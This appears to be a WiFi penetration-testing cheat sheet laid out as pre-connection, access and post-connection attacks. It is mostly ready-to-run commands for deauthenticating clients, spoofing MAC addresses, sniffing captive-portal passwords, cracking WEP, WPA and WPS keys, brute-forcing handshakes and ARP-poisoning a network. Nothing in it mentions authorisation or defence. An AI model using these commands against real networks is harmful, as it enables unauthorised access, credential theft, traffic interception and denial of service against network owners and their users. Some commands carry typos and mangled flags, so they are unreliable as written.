                                      __        ___  __ _   ____            _            _   
                                      \ \      / (_)/ _(_) |  _ \ ___ _ __ | |_ ___  ___| |_ 
                                       \ \ /\ / /| | |_| | | |_) / _ \ '_ \| __/ _ \/ __| __|
                                        \ V  V / | |  _| | |  __/  __/ | | | ||  __/\__ \ |_ 
                                         \_/\_/  |_|_| |_| |_|   \___|_| |_|\__\___||___/\__|                           
                                          Pre-connection Attacks
                                          Gaining Access
                                          Post-connection Attacks]
Other links:
https://github.com/0x90/wifi-arsenal

## WiFi Bands
-----------
● Decides the frequency range that can be used. 
● Determines the channels that can be used. 
● Clients need to support band used by router to communicate with it. 
● Data can be sniffed from a certain band if the wireless adapter used supports that band.

● Most common WiFi Bands are: 
 ○ a uses 5 Ghz frequency only. 
 ○ b, g both use 2.4 Ghz frequency only. 
 ○ n uses 5 and 2.4 Ghz. 
 ○ ac uses frequencies lower than 6 Gh
 
## Enabling monitor mode
```Bash
  > iwconfig
  > airmon-ng check kill  
  > airmon-ng start wlan1 
  > airodump-ng wlan1mon 
  > airodump-ng --band a wlan1mon (show all type of wifi networks)
  ```

Pre-connection Attacks
-----------------------
 1.Mac address changing
 2.Deauthenticating All Clients From Protected WiFi Network
 3.Deauthenticating a Client From Protected WiFi Networks
   ## mac changing
   ```Bash
    > ifconfig wlan0 down
    > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55
    > ifconfig wlan0 up
    > ifconfig wlan0
    ```
   ## Deauthenticating All Clients From Protected WiFi Network
   ```Bash
    > airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
    > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0
    ```
   ## Deauthenticating a Client From Protected WiFi Networks
    ```Bash
    > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0
    ```
Gaining Access
---------------
1.Find SSID of hidden networks
2.Bypass mac filtering
3.To gain access to
  - Captive portals
  - WEP
  - WPA
  - WPA 2
  - WPA/WPA2 Enterpise
4.Fake Access Point

  Discovering Names of Hidden Networks
  .....................................
    airodump-ng --bssid 44:55:tt:ee:ee:bb --channel 6 wlan0
    airoplay-ng --deauth 4 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0

  Bypassing Mac Filtering (Blacklists & Whitelists)
  ..................................................
    ifconfig wlan0 down
    macchanger -m 22:dd:33:44:55:66 wlan0

  Bypassing Captive portals
  ..........................
     1.Change mac address to one of a connencted client.
     2.Sniff logins in monitor mode.
       - Since captive portals are OPEN.
       - IE: they do not use encryption.
       - We can sniff data sent to/from it using airodump-ng
       - Then use WIRESHARK to read this data including passwords.
     3.Create a fake AP, ask users to login.
     4.Connect and sniff logins after running an arp spoofing attack.
       - Since captive portal are open.
       - Therefore we can connect to the target without a password.
       - We can then run a normal arp spoofing attack.
       = clients will autoatically lose their connection and will be asked to login again.
       = Dta sent to/from router including passwords will be directed to us.
mitmf --arp --spoof -i wlan0 --gateway 192.168.10.1
ettercap -Tq -M arp:remote -i wlan0 ///


WEP CRACKING
------------
Method 1 : Fake Authentication Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
root@uceka:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>

Method 2 : ARP Replay Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>

Method 3 : Chop Chop Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
 #Press ‘y’ ;
root@uceka:~# packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@uceka:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>

Method 4 : Fragmentation Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aireplay-ng -5 –b<BSSID> -h < OurMac > wlan0mon
#Press ‘y’ ;
root@uceka:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@uceka:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>

Method 5 : SKA (Shared Key Authentication) Type Cracking
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon down
root@uceka:~# macchanger –-mac <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon up
root@uceka:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
root@uceka:~# aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>

WPA PSK attack with aircrack-ng suite.
--------------------------------------

Place your wireless card into Monitor Mode
airmon-ng start wlan0

Detect all available wireless AP’s and clients
airodump-ng mon0

Setting adapter channel
iwconfig mon0 channel <channel_number>

Capturing the four-way handshake
airodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0

You can capture the handshake passively (it takes time) or de-authenticate a client.

De-authentication attack
aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0

Deauth every client - aireplay-ng -0 5 -a <bssid> mon0

Dictionary Attack
aircrack-ng -w passwords.lst capture-01.cap

Brute force Attack
crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap

WPA / WPA2 CRACKING
-------------------
Method 1 : WPS Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# apt-get install reaver
root@uceka:~# wash –i wlan0mon –C
root@uceka:~# reaver –i wlan0mon –b <BSSID> -vv –S
#or, Specific attack
root@uceka:~# reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S

Method 2 : Dictionary Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>

Method 3 : Crack with John The Ripper
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# cd /pentest/passwords/john
root@uceka:~# ./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>

Method 4 : Crack with coWPAtty
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
root@uceka:~# genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
root@uceka:~# cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>

Method 5 : Crack with Pyrit
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
root@uceka:~# pyrit –i <Wordlist> import_passwords
root@uceka:~# pyrit –e <ESSID> create_essid
root@uceka:~# pyrit batch
root@uceka:~# pyrit –r <PCAP_of_FileName> attack_db

Method 6 : Precomputed WPA Keys Database Attack
root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# kwrite ESSID.txt
root@uceka:~# airolib-ng NEW_DB --import essid ESSID.txt
root@uceka:~# airolib-ng NEW_DB --import passwd <DictionaryFile>
root@uceka:~# airolib-ng NEW_DB --clean all
root@uceka:~# airolib-ng NEW_DB --stats
root@uceka:~# airolib-ng NEW_DB --batch
root@uceka:~# airolib-ng NEW_DB --verify all
root@uceka:~# aircrack-ng –r NEW_DB <Handshaked_PCAP>


Post-connection Attacks
-----------------------
1.Capture data
2.Bypass HTTPs
3.Bypass router-side security features
4.MITM attacks
5.ARP spoofing
5.DNS spoofing
6.DoS/DDoS Attack
7.Data Modification
8.Sniffing Cookies
9.Session Hijacking
10.Information Gathering

11.STP(RSTP, PVSTP, MSTP) spoofing
12.NDP spoofing
13.VLAN hopping
14.SLAAC Attack
15.Hijacking HSRP (VRRP, CARP)
16.Dynamic routing protocol spoofing (BGP)
17.RIPv2 Routing Table Poisoning
18.OSPF Routing Table Poisoning
19.EIGRP Routing Table Poisoning
20.ICMP Redirect
21.NetBIOS (LLMNR) spoofing
22.DHCP spoofing
23.Rogue DHCP (DHCPv6)
 
 1.ARP Poisoning
  ----------------
       1.Tell the target client that Iam the router
       arpspoof -i [interface] -t [Target IP] [AP IP]
       //arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
       2.Tell the AP that I am the target client
       arpspoof -i [interface] -t [AP IP] [Target IP]
       //arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5
       
       
       

